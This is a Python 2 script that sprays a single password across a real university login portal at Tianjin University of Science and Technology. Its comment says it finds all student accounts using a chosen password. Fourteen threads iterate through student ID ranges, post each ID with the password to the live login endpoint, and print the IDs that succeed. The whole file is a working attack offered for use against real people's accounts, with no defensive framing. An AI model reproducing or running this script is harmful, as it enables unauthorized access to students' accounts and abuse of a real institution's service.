# coding=utf-8
# anka9080
# 查询天津科技大学使用了某一口令的所有学生账号

import urllib
import urllib2
import cookielib
import threading
import thread
import time
from time import sleep
# get blank cookie
cookieUrl = 'http://pic.tust.edu.cn/pic/login.do'
cj = cookielib.CookieJar()
handler = urllib2.HTTPCookieProcessor(cj)
opener = urllib2.build_opener(handler)
urllib2.install_opener(opener)
resp = urllib2.urlopen(cookieUrl)


id = 12011101
pwd = 12011101
i = j = k = l = 0
COUNT = 0
print '请输入要查询的密码:'
pwd = raw_input()

def loginTest(id):
#while i < 14:
    global COUNT
    global pwd
    j = k = l = 0
#     time.sleep(1) 
    while j < 6:
        while k < 2:
            while l < 30:         
                values = {'Login.Token1':id,'Login.Token2':pwd}
                data = urllib.urlencode(values)
                url = 'http://pic.tust.edu.cn/pic/login.do'
                request = urllib2.Request(url,data)
                response = urllib2.urlopen(request)
                html =  response.read()
                if(len(html) > 10000):
                    print id
                    COUNT = COUNT + 1
                id = id + 1
                l= l + 1
            #print '---------------------------------------------------------'
            id = id + 100 - 30
            k = k + 1
            l = 0
        id = id + 1000 - 200
        j = j + 1
        k = l = 0
    

#     id = id + 10000 - 6000
#     i = i + 1
#     j = k = l = 0
threads = []
t1 = threading.Thread(target=loginTest,args=(12011101,))
threads.append(t1) 
t2 = threading.Thread(target=loginTest,args=(12021101,))
threads.append(t2) 
t3 = threading.Thread(target=loginTest,args=(12031101,))
threads.append(t3) 
t4 = threading.Thread(target=loginTest,args=(12041101,))
threads.append(t4) 
t5 = threading.Thread(target=loginTest,args=(12051101,))
threads.append(t5) 
t6 = threading.Thread(target=loginTest,args=(12061101,))
threads.append(t6) 
t7 = threading.Thread(target=loginTest,args=(12071101,))
threads.append(t7) 
t8 = threading.Thread(target=loginTest,args=(12081101,))
threads.append(t8) 
t9 = threading.Thread(target=loginTest,args=(12091101,))
threads.append(t9) 
t10 = threading.Thread(target=loginTest,args=(12101101,))
threads.append(t10) 
t11 = threading.Thread(target=loginTest,args=(12111101,))
threads.append(t11) 
t12 = threading.Thread(target=loginTest,args=(12121101,))
threads.append(t12) 
t13 = threading.Thread(target=loginTest,args=(12131101,))
threads.append(t13) 
t14 = threading.Thread(target=loginTest,args=(12141101,))
threads.append(t14) 

if __name__ == '__main__':
    
    for t in threads:
        print t
        #t.setDaemon(True)
        t.start()
    for t in threads:
        t.join()
    

    print '查询结束 '
    print '查询到' + str(COUNT) + '名同学使用该密码作为登陆口令！'

